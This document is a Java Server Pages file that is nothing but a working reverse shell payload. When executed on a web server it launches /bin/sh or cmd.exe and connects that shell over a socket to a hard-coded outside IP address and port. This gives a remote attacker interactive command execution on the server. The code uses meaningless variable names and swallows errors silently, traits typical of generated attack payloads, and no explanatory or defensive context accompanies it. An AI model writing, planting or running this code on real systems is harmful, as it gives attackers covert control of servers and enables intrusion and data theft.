<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream vp;
    OutputStream vc;

    StreamConnector( InputStream vp, OutputStream vc )
    {
      this.vp = vp;
      this.vc = vc;
    }

    public void run()
    {
      BufferedReader sm  = null;
      BufferedWriter ycf = null;
      try
      {
        sm  = new BufferedReader( new InputStreamReader( this.vp ) );
        ycf = new BufferedWriter( new OutputStreamWriter( this.vc ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = sm.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ycf.write( buffer, 0, length );
          ycf.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( sm != null )
          sm.close();
        if( ycf != null )
          ycf.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "12.181.191.34", 8456 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
